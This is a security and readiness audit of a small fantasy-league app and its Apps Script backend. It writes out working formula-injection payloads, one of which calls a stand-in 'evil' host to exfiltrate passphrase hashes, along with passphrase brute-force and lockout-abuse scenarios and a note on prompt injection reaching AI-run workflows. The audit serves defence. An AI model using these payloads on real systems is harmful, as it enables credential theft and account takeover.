# REEL readiness audit (2026-11-07)

Full review of the REEL app (`lab/`), its Apps Script backend and the robots, plus a map of every classic-site
element to the app. Reviewed against `main` at commit `5f21b55` (backend logic v0.27, daily VER 8).
The three detailed reports are appended below (Parts A–C). Nothing was changed while reviewing.

## Verdict

**Not ready for real owners yet. It's close, but the security and money gaps have to close first.** The product is
rich and largely works: no JS errors on any tab, inputs are safe from code injection, owners can't read each other's
DMs or offers, and commish actions are gated on the server. But four backend holes and two front-end problems would
hurt real users. The beta crew (nephews) can start once Phase 1 is done.

## Phase 1: before the beta crew (blockers)

**✅ Phase 1 shipped 11/7** (backend v0.28–0.30 + lab): formula guard, device tokens + no auto-lockouts + GRONK-PISTOL-427 peppered passphrases, server credit checks, test scores testers-only, beta wording with a `STAGE` switch. Regression test no longer clock-dependent. Before the crew starts: issue them **new** passphrases (old two-word ones still work but are the weak kind).

| # | Issue | Why it matters | Fix |
|---|---|---|---|
| 1 | **Formula injection** (A·B1): Events, the email setting, the request note and perk notes skip `safe_()` | A reaction or note like `=JOIN(...Owners!D:E)` turns into a Sheet formula, and the public summary returns every passphrase hash | Run `safe_()` inside `log_`, settings, request and perk writes; reject a leading `= + - @` in email |
| 2 | **Passphrases guessable** (A·B2): 6,969 phrases, plain SHA-256, sign-in tests all 34 owners | About 8 h of 25 tries an hour gets into some account, and every account sees all contacts | 3 words + 2 digits, HMAC with a pepper in Script Properties, cap tries per device |
| 3 | **Lockout abuse** (A·B3): 5 anonymous calls lock any owner; an old phone polling with the old passphrase re-locks them after a reset | Owners locked out, commish stuck unlocking | Don't count background reads; failed tries decay; client stops polling on `auth:false` |
| 4 | **No server-side credit balance check** (A·B4) | A 999,999-credit trade or repeated perks reach the ledger | Check the balance (including pending holds) in `offer_`, `respond_`, approve and `perk_`; credit-sync refuses negative balances |
| 5 | **Fake "Test scores" on by default for every owner** (B·B1) | Before kickoff, Match shows made-up LIVE points and a fake ✖️2 bonus | Commish/beta only and off by default, or remove it |
| 6 | **Lab wording** (B·B2): LAB banner, "About this prototype", "MAFFL HQ · Lab" title, `/lab/` links | Feels like a test, and texted links break at go-live | One go-live switch list (Phase 3) |

## Phase 2: before go-live (should fix)

**✅ Phase 2 shipped 11/7** (backend v0.31–0.32 + lab + Code.gs): busy JSON, lock-free chat reads, daily outside the lock (one at a time), chunked tick memory, daily.js last-good copy, public summary cached; roster checks + no double-traded players + duplicate-safe offers/perks; request email cap; Try again instead of endless spinners, boot retry, confirm-and-clear sign-out, week-replay lines; 29 KB logo; tester/desk buttons in the header; contrast. **Open:** paste the new Code.gs (logic.js last-good copy); reading only the tail of Chat/Events (S6) waits until the tabs actually grow; a GitHub rule requiring PRs for `_ops/apps-script/**` is the commish's call.

- **Robustness:** Chat and Trades spin forever when the backend is down, and a weekly.html failure is a dead end with no retry (B·S2, S3). A lock timeout returns HTML instead of JSON (A). "Run daily now" holds the lock for minutes (A). The tick's reminder memory overflows the 9 KB property limit at about 270 entries and then reposts every 15 min (A). The 8-second chat poll takes the global lock (A).
- **Trades:** players in an offer aren't checked against rosters (one player can be in two approved trades), and retries create duplicate offers or perks (A).
- **Supply chain:** only the `mod_*` parts have the 6 h last-good copy. If `logic.js` or `daily.js` fail to load, sign-in goes down. Give them the same fallback (A).
- **Email quota:** unauthenticated passphrase requests can burn the 100-a-day mail limit (A).
- **Sign-out:** ask to confirm, and clear the cached summary (it holds every owner's email and phone) (B·S4).
- **Wrong passphrase:** show the error inline instead of in a toast (B·S5).
- **Week replay:** shows this week's robot line on an old week's result card (B·S1).
- **Images:** the 893 KB logo loads everywhere. Make a 180 px touch icon and a 96 px UI copy (B·S7).
- **Testers' pills:** the floating 🧪/📥 pills cover content, and grey text contrast is about 2.8:1 (B·S9, S10).
- **Regression test:** depends on the clock (daily `slot` am/pm, plus the Dec 2 trade deadline). Mask it or freeze the mock's clock (A).

## Phase 3: the go-live switch (one scripted step, not hand edits)

- App to the root: rewrite 33 `../` refs and point the `lab/` data files (Part C, link plan). Add `<link rel=manifest>`, an app title, theme-color, a description and analytics (gtag is on all 13 classic pages). Drop `noindex`.
- `API_URL` for the production Sheet appears in 4 places: `lab/index.html` plus the desk-notify, card-lines and pulse-draft workflows. Remove the `maffl_lab_api` override. Point `APP_LINK` and the backend `APP_URL` at the root.
- `CREDIT_SYNC=live`. Use a fresh Sheet (no test trades or chat). Remove the LAB banner and prototype copy.
- `lab/` becomes a redirect that keeps `#offer-ID`. Retired pages (`stats.html`, `overview.html`) become redirects, not 404s.
- **Five classic pages must stay:** the app reads `weekly.html`, `credits.html`, `prize.html`, `rules.html` and `power-rankings.html` at runtime and embeds `rivalry.html`. Retiring the Pulse would freeze the app's week history, so keep WEEKS being written or generate `pulse-data.js` first.
- **Guest "Just browsing":** build it or formally drop it. Without it, the front door becomes a passphrase wall.

## Legacy → REEL: decisions for the commish (Part C)

91 classic elements: ✅ 29 in REEL · 🟡 22 partial · 🔗 12 link-out · ❌ 22 missing · 🗑️ 6 retire.
Biggest gaps, each needing a call to build it, keep the classic page, or drop it:

1. Power Rankings ranked list (owner sheet has ratings; no list, no tier filter).
2. Rivalry discovery: two-owner picker, 9 "MAFFL's Best" boards, the week's rivalry slate.
3. Dues: Venmo button (one line) and a league paid/unpaid view.
4. Draft Day / offseason: countdown, run of show, ESPN draft-room and Meet links, Week 0 recap. Owners have no ESPN link at all.
5. Next week's league-wide slate (`previewsFor()` already builds it) and the full Pulse news reel.
6. League-wide credit ledger (Team → Credits shows only yours). Remove the 2 stale "Credit requests (form)" links.
7. Rulebook News & Announcements and "New in the Rulebook" (rendered by JS, so the app's parser drops them).
8. Sortable all-time stats table, draft search filters, prize history by year, Lower/relegation brackets.
9. A version / Last Updated stamp for the app (CLAUDE.md convention).

Docs drift: REEL.md §2 still describes the inbox Home, the Money tab and League → History. The code has the feed,
no Money tab, and the Vault.

---

# Part A: Backend review


Scope: `_ops/apps-script/*` (logic.js v0.27 + parts + daily.js), Code.gs loader, the workflows that call the backend, `_ops/tests/`.
This was a read-only review. Probes were run against the mock (`/tmp/probe/p1..p4.js`). **REPRODUCED** means it was run against the mock.
Limit of the mock: it stores Sheet values as raw strings and does not evaluate formulas. The formula items below rely on documented Apps Script behaviour: `setValue`/`appendRow` turn a string that starts with `=` into a formula. The code's own `safe_()` guard exists because of this.

---

### BLOCKER: fix before real users

#### B1. Formula injection lets a signed-in owner (or the public) read every salt and passphrase hash
- **Evidence:** `safe_()` (mod_social.js:52) is used for chat, offer notes, feedback and polls only. These writes skip it:
  - `log_` → Events ref/value/meta (logic.js:203). This covers react `ref`, vote `choice` and the block `note` (logic.js:85-88).
  - `saveSettings_` email (logic.js:244 regex allows `=`; write at logic.js:250).
  - `request_` note, **unauthenticated** (logic.js:218).
  - `perk_` player and note (mod_trades.js:125).
- **REPRODUCED:**
  - `block` with note `=JOIN(",",Owners!D2:E40)` is accepted. `summary.block["U:X"].note` returns the formula string to every tier-mate.
  - The email `=JOIN(",",D2:E40)&"@x.co"` passes validation and is stored as-is in Owners.
  - React ref `=IMPORTDATA("https://evil/"&Owners!E2)` is stored in Events.
  - An unauthenticated `request` note `=IMPORTDATA(...JOIN(Owners!D2:E40))` is stored in Requests.
- **Failure scenario:**
  1. One owner reacts with `ref = =JOIN(",",Owners!D2:E40)`.
  2. `summary_` counts reactions by the computed ref (logic.js:269, 277). **Unauthenticated** `GET ?action=summary` (logic.js:58) then returns all salts and hashes as a key of `counts`.
  3. There are only 6,969 possible passphrases (see B2). Cracking all 34 owners takes milliseconds, including the commish.
  4. The commish account can issue passphrases, approve credit trades and push to gold.
  5. The `contacts_` email field (logic.js:257) also echoes the computed value to every signed-in owner.
- **Fix:** Run every user string through `safe_()` in one place, inside `log_`, `setCell_` and every `appendRow` call site. Also reject a leading `=+-@` in the email check.

#### B2. Passphrases can be brute-forced in about 8 hours through the league-wide sign-in
- **Evidence:**
  - The two word lists are 82 × 85 words, giving **6,969 distinct phrases** (logic.js:32-49; computed).
  - Passphrase-only sign-in tests each guess against all 34 hashes (logic.js:160). The only limit is 25 failures per hour league-wide (logic.js:29, 157-162).
  - The per-owner path allows 4 more guesses per owner, and its failed-try count never decays (logic.js:176-180).
  - The hash is a single unpeppered SHA-256 (logic.js:145-147).
- **Scenario:** Each guess has a 34/6969 ≈ 0.49% chance of matching some owner. That is about 205 guesses, or **~8.2 hours** at 25 per hour. The attacker then holds a real account, which gets every owner's email and phone (`contacts_`, logic.js:292) and enables B1.
- **Fix:** Make the phrases 3 words plus 2 digits (≥10⁸ combinations). Store HMAC-SHA256 with a pepper kept in Script Properties. Require the owner name on sign-in, or cap guesses per IP or device token, and keep the league-wide cap only as an alarm.

#### B3. Anyone can lock any owner out, and an old device locks its owner out after a reset
- **Evidence:**
  - `login_` with any owner name increments `failed_tries` and locks at 5 (logic.js:176-180). Owner names are public (`GET ?action=owners`, logic.js:63).
  - Every authenticated action goes through `login_` (logic.js:194-197). The client polls `inbox` every 30 s with the stored passphrase (lab/index.html:3543, 869) and ignores errors (lab/index.html:3526-3530).
  - APP_DESIGN §4 notes that a Home-Screen app and Safari keep separate storage.
- **REPRODUCED:**
  - 5 unauthenticated `login` calls with a wrong passphrase lock the victim; their correct passphrase then returns "Locked".
  - In p4.js the commish uses `deskact issue` to give Ed a new passphrase. 5 inbox polls from his old device, about 2.5 minutes of polling, lock Ed, and the **new** passphrase is refused.
- **Fix:**
  - Count failures per owner plus device, or per time window. Don't lock for background reads.
  - Return `{auth:false}` so the client stops polling and asks for the passphrase again.
  - Let failed tries decay, for example to 0 after 1 hour.

#### B4. Nothing on the server stops over-spending or double-spending credits, and approved rows flow into gold
- **Evidence:**
  - The code says so itself: "Balance is checked in the app and by the commish" (mod_trades.js:90).
  - Trade credits are only floored and kept ≥0, with no upper bound (mod_trades.js:15). `perk_` has no balance check either (mod_trades.js:92-136).
  - The client balance counts approved rows only, so pending requests are not subtracted (lab/index.html:992).
  - credit-sync.yml has no balance check.
  - The APP_DESIGN §9 go-live checklist explicitly requires an "over-balance block".
- **REPRODUCED:**
  - A trade with `giveCredits: 999999` is accepted. When approved, it writes a ledger row of `-999999` and pushes it.
  - Three `faab qty:20` requests (60 credits) in a row are all accepted.
- **Fix:**
  - In `offer_`, `perk_` and at approval, compute balance = gold balance (Credit_Log or `credits.html`) − pending REQUESTED/ACCEPTED commitments, and refuse to go over it.
  - Make credit-sync fail on any negative balance.

---

### SHOULD: fix before go-live

#### S1. Runtime code loading: no fallback for logic.js or daily.js, and a bad push takes everything down
- **Evidence:**
  - Code.gs:19-24 caches logic.js for 5 minutes only, has **no last-good copy**, and throws on any non-200.
  - `need_` (logic.js:301-304) has the same problem for daily.js.
  - Only the parts have a 6-hour last-good copy (logic.js:347-349). Even that copy only covers fetch failures: a syntax error in a part or in logic.js throws at `eval` (logic.js:355) or at `new Function` (Code.gs:27). Then doGet, doPost and tick all fail, and the client gets Google's HTML error page, not JSON.
  - Any commit to `main` runs as the commish's Google account, with MailApp access, the Sheet's hashes and the GITHUB_TOKEN/ESPN/DESK_KEY properties.
  - Writers to `main` include the GitHub Actions running Claude with `Bash` and `contents: write` (pulse-draft.yml:33-34, 182/196/214; claude-mention.yml:11-12). Those jobs read ESPN data, and team names in it are owner-controlled, so prompt injection is possible.
  - The backend's own GITHUB_TOKEN can also rewrite logic.js (mod_trades.js:212-221).
- **Scenario:** raw.githubusercontent returns a 429 or 5xx after the 5-minute cache expires, or a push with a typo lands. Sign-in, chat and trades are down for everyone until someone reverts.
- **Fix:** Re-paste Code.gs once before go-live:
  - keep a 6-hour `logic_last` and fall back to it on non-200 *or* on a compile error;
  - wrap `new Function` in try/catch;
  - optionally pin the version with a commit SHA held in Script Properties.
  - Add a GitHub ruleset that requires a PR for `_ops/apps-script/**`.

#### S2. The global script lock is taken for chat polling, and "Run daily now" holds it for minutes
- **Evidence:**
  - Only `summary` and `inbox` skip the lock (logic.js:185). An open thread polls `chat` every 8 s (lab/index.html:3542), and every poll takes the script lock (logic.js:79-80). Each `chat` reads all of Chat, Offers and Events (mod_social.js:91-94).
  - `lock.waitLock(10000)` sits **outside** the try (logic.js:80). A timeout therefore throws and returns an HTML error, not JSON.
  - `deskact daily` runs `DAILY.run` (up to roughly 200 s or more of ESPN calls) while holding the lock (mod_desk.js:51). mod_desk.js:149 says the daily run should run outside the lock.
- **Scenario:**
  - On a Sunday, 10 owners have chats open, which is about 75 locked calls a minute. Sends and trades queue, time out and fail.
  - The commish taps "Run daily now", and every write across the league fails for about 3 minutes.
- **Fix:**
  - Make `chat` lock-free and take a short `tryLock` only when `markRead_` actually needs to write.
  - Move `waitLock` inside the try and return JSON `{busy:true}`.
  - Run the daily job from a one-off trigger instead of inside the request.

#### S3. The tick's TICK_SENT script property will hit the 9 KB per-value limit
- **Evidence:** TICK_SENT gains one key per reminder (`perkwait:`, `perklock:`, `review:`, `espnwait:`, `espnname:`, `tdl:`), each about 34 bytes, kept for 60 days (mod_desk.js:141-142, 164-165). Apps Script limits a property value to 9 KB, which is about 270 keys.
- **Scenario:**
  1. Mid-season, `setProperty("TICK_SENT")` throws, and the error is caught (mod_desk.js:168).
  2. The memory of what was already sent is never saved, so **every 15 minutes the desk gets every reminder again**.
  3. LAST_TICK also stops updating, so the daily health check reports that the robot is dead.
- **Fix:** Store sent keys in a small Sheet tab, or prune to 14 days and cap the count. Guard LAST_DAILY's size the same way, since its problems array is unbounded (daily.js:251).

#### S4. Trades aren't checked against rosters, and one player can be traded twice
- **Evidence:**
  - `offer_` never checks that `give` players are on my roster or `get` players on theirs (mod_trades.js:14). Player-name strings have no length limit; a cell holds at most 50k characters.
  - `respond_` accept doesn't check that the players are still there or not already in another ACCEPTED/APPROVED offer (mod_trades.js:41-53).
- **REPRODUCED:**
  - An offer with "Some Random Guy Not On Roster" is accepted.
  - The same player, Josh Allen, is sent to two owners: both offers are accepted and both are approved.
- **Fix:**
  - At offer time and at accept time, check players against `rosters_(tier)`, which is cached.
  - Block an accept when a player is in another live ACCEPTED/APPROVED offer.
  - Truncate each player string to 60 characters.

#### S5. Retries create duplicate offers and perks
- **Evidence:** `offer_` (mod_trades.js:19-22) and `perk_` (mod_trades.js:124-125) always create a new ID. Only chat has a 2-second throttle (mod_social.js:117-119).
- **REPRODUCED:** Two identical `offer` calls give T5578DB8C and T092A5A68. Three faab requests give three REQUESTED rows.
- **Scenario:** On flaky phone signal the Apps Script call succeeds but the response is lost. The owner taps Retry and sends a duplicate offer, or a duplicate FAAB charge.
- **Fix:** Have the client send a `req_id` (UUID) with each write. The server stores it in a 10-minute cache entry and returns the first result on a repeat.

#### S6. Every request reads whole tabs, and the tabs only grow
- **Evidence:**
  - `summary_` reads Events, Polls, Owners, Offers, Perks, Reads and Chat in full (logic.js:265, 287; mod_trades.js:72, 81, 157; mod_social.js:144, 147).
  - The client calls summary on every open, and `inbox` every 30 s per open app (lab/index.html:3543).
  - Events (append-only reactions and votes) and Chat (every message, kept forever; `CHAT_KEEP` only limits what is returned) grow all season.
  - Unauthenticated `GET summary` is uncached and does the same full read (logic.js:58), so anyone can make it expensive.
- **Scenario:** By late season, with tens of thousands of rows, each summary or inbox call takes several seconds. Combined with S2, chat feels broken and you get closer to the concurrent-execution limit, which is about 30 for a consumer account.
- **Fix:**
  - Cache the public summary for 30-60 s in CacheService.
  - Read only the tail of Chat and Events (`getRange(last-N…)`, as TapLog already does at mod_social.js:36).
  - Archive Chat and Events weekly into a second tab.

#### S7. The unauthenticated `request` action can use up the email quota and break passphrase requests
- **Evidence:**
  - `request_` needs only a valid owner name and allows 3 per owner per day (logic.js:212-217). 3 × 34 = 102 emails a day, which is over the consumer MailApp quota of 100 recipients a day.
  - `MailApp.sendEmail` is not in a try (logic.js:220), so once the quota is gone the call throws after the row is written and before `deskPost_` runs.
  - The rate check reads the `ts`/`owner` headers by name, but mod_desk.js:23 says the real Requests headers "vary". If the headers differ, the limit silently never fires.
- **Fix:**
  - Wrap the email in a try.
  - Rate-limit league-wide (for example 10 an hour).
  - Read Requests by column position, as `openRequests_` does.

#### S8. On launch night, owners' typos can pause sign-in for everyone, the commish included
- **Evidence:** The 25-per-hour league-wide failure cap blocks the passphrase-only path for every owner (logic.js:157-158). The client signs in with the passphrase only (lab/index.html:2190).
- **REPRODUCED:** After 25 bad tries, the commish's correct passphrase returns "Too many wrong tries. Wait an hour".
- **Scenario:** The go-live email goes out (§9) and 34 non-technical owners type two-word phrases on their phones. 25 typos within an hour is likely, and everyone, including the commish, is locked out for an hour.
- **Fix:** Fixing B2 (more combinations plus per-device limits) lets this cap rise to around 200 an hour, used as an alarm. Let the commish bypass it by entering his name.

#### S9. Test and sandbox settings to change at go-live
- `CREDIT_SYNC` must be set to `live`. Anything else means test (mod_trades.js:178). The "test Sheet only" comments are at mod_trades.js:7, 88 and mod_social.js:44.
- A new production Sheet means a new Apps Script deployment and a new `/exec` URL. That URL is hard-coded in **4 places**: lab/index.html:839, desk-notify.yml:28, card-lines.yml:27 and pulse-draft.yml:235.
- `localStorage.maffl_lab_api` overrides the API URL (lab/index.html:840). Beta phones that point at the test URL will keep it after launch. Remove it or rename the key at go-live.
- `APP_URL` points to `/lab/` (logic.js:19), and every notification email links there.
- If the test Sheet is reused, test Offers, Perks, Chat, Events and Awards stay visible: tier-public ACCEPTED/APPROVED trades, chat history and reactions. Set up a fresh Sheet and run `deskact tour` for everyone.
- Season constants are hard-coded: `TRADE_DEADLINE` (logic.js:12), `INSURANCE_CLOSES` (logic.js:21), the 2026 dates and the Nov 1 DST switch in `perkDeadline_` (logic.js:24-28), `SEASON` (mod_espn.js:10), `season: 2026` in ledger rows (mod_trades.js:185, 193-201) and the "2026" filter (daily.js:153). They are fine for 2026, but must change for 2027.
- No hard-coded "Mike Murello" was found in the backend. The commish comes from `Owners.is_commish`. The mock does hard-code the commish (mock.js:323).

#### S10. The regression test depends on the clock (REPRODUCED)
- **Diff:** The only change is in `desk` → `daily.slot`: `"2026-11-07 am"` expected vs `"2026-11-07 pm"` now, run at 6:13 PM ET.
- **Cause:** `DAILY.slot()` uses the real clock in America/New_York (daily.js:257-259). It is stored in LAST_DAILY (daily.js:251) and returned by `desk_` (mod_desk.js:42). regress.js's `norm` masks ISO timestamps but not `"YYYY-MM-DD am|pm"` (regress.js:7-14). So the test also fails on any other date, and before 5 AM the value becomes `null`.
- **The next date trap:** After `TRADE_DEADLINE` (Dec 2), `respond accept` returns "deadline has passed". During the 24 hours before it, `tickDeadline_` posts extra messages.
- **Fix:** Add `.replace(/"slot":"[^"]*"/g,'"slot":"<slot>"')` to `norm`. Better, give the mock a fixed fake clock (override `Date` in the vm context).

---

### NICE: later

- **N1. `announce_` can pin the wrong message** (mod_desk.js:96). It pins `sh.getLastRow()` after `post_`, but daily.js (daily.js:196, 239) and GET-path `deskPost_` calls (for example `espn_` on a 401, mod_espn.js:60-61) append to Chat without the lock. Return the row from `post_` and pin by ID.
- **N2. The rosters cache could stop working** (mod_espn.js:156). The rosters payload is already 64.8 KB for tier U at Week 9 in the mock, and it grows with the per-week `wk`/`ws` maps. Past 95,000 characters it is silently not cached, so every Team or League open hits ESPN. Cache `wk`/`ws` separately.
- **N3. An approved trade or perk can't be reversed** (mod_trades.js:58, 140). A mis-tapped Approve pushes the ledger straight to gold (mod_trades.js:65, 149). Add a commish "reverse" that writes offsetting ledger rows.
- **N4. Owners can make up group DMs** (mod_social.js:60). `canRoom_` only checks that you are one of the names after `dm:`, so you can create `dm:a|b|me`. **REPRODUCED:** it shows up in both victims' inboxes as an unread spam thread. Not a leak, since reads match the room exactly. Require exactly 2 names, one of them you.
- **N5. Anyone can put any player on the trade block** (logic.js:88; mod_trades.js:80-84). There is no roster check, and the last write wins. The client filters by roster owner (lab/index.html:2279), so the effect is cosmetic.
- **N6. Sessions: the passphrase is the session.** It is stored in plain text in localStorage (lab/index.html:869) and sent with every call, and the only way to revoke it is a reset, which then triggers B3. Consider a signed token with an expiry kept in Script Properties.
- **N7. Small public information leaks:** `GET owners` shows hasPin (logic.js:63); `GET daily` shows run problems (daily.js:273); `GET summary` shows the last sync error text (logic.js:291).
- **N8. DESK_KEY and bot posting are fine.** It is compared on the server, empty means closed, it travels in the POST body (not the URL), and the workflows keep it in a separate step from Claude (card-lines.yml:49-51). Make sure it is 32 or more random characters, because bad keys aren't rate-limited (mod_desk.js:103-104, 129-130).
- **N9. Quotas to measure on the real deployment** (consumer Gmail account):
  - triggers get 90 minutes a day of total runtime: 96 ticks plus 2 daily runs;
  - UrlFetch 20k a day: fine;
  - MailApp 100 recipients a day: see S7;
  - CacheService under 100 KB per value: guarded.
  - Log `secs` from `tickRun_`, as daily already does.

### Checked and OK
- **No IDOR found.** Each of these was **REPRODUCED** as refused:
  - Owner A reading a B↔C DM: "That chat isn't yours to read".
  - Accepting someone else's offer.
  - Cancelling someone else's perk.
  - Deleting someone else's message.
  - Non-commish `desk`, `deskact issue`, `resync` and `commish`: all "Commish only".
  - Settings return only your own data (logic.js:237-240).
  - Unauthenticated `GET summary` returns 0 contacts and 0 offers.
- **Commish gating is enforced on the server** (logic.js:96, 101-102; mod_trades.js:56, 142; mod_social.js:136).
- **No client XSS found.** `esc()` (lab/index.html:827) escapes `& < > " '`. `fmtText` escapes before highlighting @mentions (lab/index.html:3058). Chat, offer notes, reasons, block notes, pins and the desk all go through `esc`/`fmtText`.
- **Writes in doPost are all under the script lock.** The ledger push is idempotent: it rebuilds the whole ledger and skips the push when nothing changed (mod_trades.js:205-216). Test and live rows are kept apart by `sync` mode.
- **Trade deadline:** enforced at offer and accept (mod_trades.js:10, 47). Commish approve/negate still works after the deadline, which looks intended.

---

# Part B: App (front end) review

_Screenshots were taken in the review session and are not saved in the repo._


Method: `_ops/tests/shoot.py` plus a modified copy (`/tmp/rv/shoot2.py`). The copy can sign in as any owner or as no one,
point at a dead API, delay the mock, block static files, seed payloads, and fake ESPN returning all zeros (`/tmp/rv/shoot_zero.py`).
Owners used: Mike (commish + beta), Sam Lavrinc (Lower, beta), Todd Trozzo (Lower, plain owner). 390x844 @2x.
Screenshots are in `/tmp/review/shots/`. REPRODUCED = I saw it in a screenshot or a DOM check. Every tab shot had no JS errors
while the backend was up.

---

### BLOCKER (fix before real users)

**B1. Fake "Test scores" are on by default for every owner whenever ESPN shows all zeros** — REPRODUCED
- Evidence: `shots/testscores.png` (Todd Trozzo is not beta and not commish). index.html:1878-1883 `simWanted()` is true unless
  `maffl_lab_sim === "off"`, and that key is never set for a new owner. shoot.py hides this by setting the key to `off`.
- What an owner sees: every week before kickoff, Match shows "WEEK 9 · ● LIVE" with made-up points, players "In progress",
  and a made-up ✖️2 Double Player Bonus for the opponent (+29.79). The only hint is a small "🧪 Test scores · turn off" pill.
- Fix: remove the simulator, or show it only to commish/beta and keep it off by default. When the week hasn't started, show the "not kicked off" state.

**B2. Lab and prototype wording is still shipped to every owner** — REPRODUCED
- Evidence: `shots/home.png` banner "LAB · TRADES & REACTIONS ARE TEST-ONLY" (index.html:778). `shots/todd_more.png` shows
  "About this prototype: Lab prototype: read-only for now… Reactions and votes save to the test league Sheet" (2142).
  `<title>MAFFL HQ · Lab</title>` (9) becomes the Home-Screen icon name. `APP_LINK = …/maffl/lab/` (871) goes into every
  "Text them / Email them" trade link. API_URL is the TEST-backend deployment (837-839).
- What an owner sees: a test product. Texted links point at /lab/ and will break after the go-live move.
- Fix: add these to a go-live switch list (APP_DESIGN §9): banner, About copy, title, APP_LINK, API_URL, and the 🧪 Beta desk panel.

### SHOULD (before go-live)

**S1. Replaying an old week shows this week's robot line on the result card** — REPRODUCED
- Evidence: `shots/weeks.png`. The Week 6 card shows 167.96–145.94 vs Southside Shooters, but the line under it reads "You beat
  The Big Bang Theory by 29.64, 3 straight now" (that's Week 8). index.html:1698 uses `dailyLine(ME.owner,"result")` and never checks `W === LATEST`.
- Fix: use the daily line only when `W === LATEST`, and otherwise fall back to `lw.note`. Check `previewsFor` / "next" lines the same way.

**S2. When the backend is down, Chat and Trades spin forever** — REPRODUCED
- Evidence: `shots/dead_chat.png` still shows "Loading your chats…" after 14 s. Team → Trades still shows "Loading trades…" after 12 s.
  In `loadSummary()` (1121-1132) the `.catch(function(){})` swallows the network error, so `SUM_OK` stays false. The chat inbox
  (3462) and Trades wait on `SUM_OK`.
- Match handles this well: it retries twice, then shows "Live scores are unavailable right now · Try again" (`shots/dead_match12.png`).
- What an owner sees: an endless spinner during Apps Script quota limits or outages. Home and League still work.
- Fix: in the catch, set a `SUM_FAIL` flag. Chat and Trades then show "Couldn't reach the league server · Try again", like Match.

**S3. If weekly.html fails to load, the app is a dead end** — REPRODUCED
- Evidence: `shots/dead_static.png` shows only the text "Couldn't load the league data (Failed to fetch)." (3864). There's no retry button
  and no service worker or offline copy. Boot needs weekly.html, prize.html and credits.html first.
- What an owner sees: in Home-Screen standalone mode there's no reload button or pull-to-refresh, so they have to force-quit the app.
- Fix: add a "Try again" button that calls `location.reload()`. Optionally cache the last WEEKS in localStorage and boot from it.

**S4. Sign out takes one tap and leaves private data on the phone** — REPRODUCED
- Evidence: More → Sign out (`#mSwitch`, 2144) signs out immediately with no confirm. Afterwards localStorage still holds
  `maffl_lab_sum`, which includes every owner's email and phone (`sum.contacts`), plus perks and offers, along with `maffl_lab_live_U` and `maffl_lab_daily`.
  APP_DESIGN §4 says sign out exists for shared family devices, and that contacts are for signed-in owners only.
- Fix: ask "Sign out? You'll need your passphrase again". On yes, clear `maffl_lab_sum`, live, daily, seen and tour keys.

**S5. Wrong passphrase only gets a fleeting toast, and the field is wiped** — REPRODUCED (toast); likely hidden on iPhone
- Evidence: `shots/signin_wrong.png`. The message "That passphrase doesn't match anyone" shows as a toast at bottom+90px for 2.6 s,
  and the input is cleared (2192). If the owner pressed Go/Enter, the keyboard stays up, so the toast likely sits behind it.
  There's no tries-left warning before the lockout.
- Fix: show the error inline under the field, keep the typed text selected, and link to "Request it".

**S6. Signed-out / guest mode isn't built**
- Evidence: `shots/signin.png`. Signed out, the owner only gets the passphrase screen. APP_DESIGN §4's "Just browsing" mode and the §9 checklist item "Guest view checked logged out" are both open.
- Fix: build it, or formally drop it from §4 and §9 before go-live.

**S7. The 893 KB logo PNG loads on every visit** — REPRODUCED (perf run)
- Evidence: `maffl-logo.png` is 1254x1254 and 893 KB. It's used for the header (shown at about 40 px), the boot screen, the welcome screen, every crest stamp on cards,
  and the apple-touch-icon (index.html:10-11, 782, 787, 1828, 2160). It's bigger than all the gzipped text combined.
- Fix: add `maffl-logo-180.png` (touch icon) and a 96 px webp/png for the UI, at about 10–20 KB each.

**S8. Links to classic pages leave the app**
- Evidence: `<a href="../speakup.html">`, `../credits.html` ("Credit requests (form)", in More and League → Rules & $),
  `../power-rankings.html`, `../history.html`, `../draft.html`, `../weekly.html`, `../rules.html#credit-system`, and rivalry.html.
  Those pages link back to `index.html` (the old home), not `/lab/`.
- What an owner sees: in standalone mode there's no back button, so they're stuck on the old site (beta crew now; after go-live this resolves to index.html).
  "Credit requests (form)" also duplicates the in-app perk requests.
- Fix: open them in a sheet or iframe (like rivalry `?embed=1`), or with `target=_blank`. Drop the credit form link.

**S9. Floating 🧪 Feedback and 📥 Desk pills cover content (commish + beta crew)** — REPRODUCED
- Evidence: `shots/match.png` (covers the opponent's TE/FLEX rows), `shots/feed_montage1.png` (covers card reaction rows),
  `shots/chatroom.png` (Feedback sits over the chat header), `shots/credits.png`.
- What a tester sees: these are exactly the people testing, and they'll tap reactions and hit the pill instead.
- Fix: dock both into the header or the You menu, or add bottom padding to views when the pills show.

**S10. Grey text contrast fails WCAG AA** (measured)
- `--muted #8a9ab5` is 2.85:1 on white and 2.68:1 on the page background. Gold eyebrows `#d98e10` are 2.68:1, and `--gold #f5a623` is 2.03:1 on white.
  It's used for all 12 px `.meta` text, tab labels, and card eyebrows (`shots/team.png`, `shots/league.png`). Many owners are older and read outdoors.
- Fix: darken muted to about `#5f6f8a` (≥4.5:1) and the eyebrow gold to about `#a86a00`.

### NICE (later)

**N1. "🧪 Staged roster" with dashes when ESPN rosters can't be read** — REPRODUCED `shots/dead_team.png`. "Staged" is tester wording.
  Change it to "ESPN is unavailable · showing your draft roster".

**N2. Unhandled promise rejection** ("Failed to fetch" pageerror) whenever the backend is unreachable. Some `api()` caller has no catch.
  Harmless, but it's noise in error logs.

**N3. Tap targets under 44 px** (DOM audit): inline team/player name buttons are 17–22 px tall, standings "⚔️ Rivalry ›" is 78x14,
  the sheet close × is 26 px wide, the Upper/Lower toggle is 27 px tall, and "Profile ›" is 31 px. Pad the hit areas.

**N4. Reaction emoji buttons have no aria-label** (66 on Home). Other icon-only buttons (chip, ×, ‹, ✎, Desk, Feedback) are labelled.

**N5. `maximum-scale=1` in the viewport meta (index.html:5)** blocks pinch-zoom on Android. iOS ignores it. Remove it, or rely on `touch-action`, which is already set.

**N6. Home's first card sits about 140 px below the strip** with empty space above it (`shots/sam_home.png`). That's prime screen space on a phone.

**N7. The trade grade can insult the receiver**: "YOU A+ / BRAIDEN D", next to "Now F … Future A+" (`shots/trade_step2.png`). It's confusing
  that the overall grade is A+ when "Now" is F. Consider hiding the other side's letter grade.

**N8. Copy and data nits**: "1 credit are held" (perk confirm). The Wire card has a dangling "·" when pos/team is empty (`feed_montage2.png`).
  The sheet header is a roughly 65 px blank band with only × (`shots/player.png`). Home's badge (17/18) doesn't match "1 OF 17".

**N9. Sign-in details**: the placeholder "GRONK-PISTOL" is the mock commish passphrase, so make sure no real passphrase uses it.
  Request-access lists co-owned teams as one entry ("Jon Murello/Rick Simmons").

**N10. Home-Screen setup**: lab has no `<link rel=manifest>` and no `apple-mobile-web-app-title`. The apple-touch-icon is the 1254 px PNG.
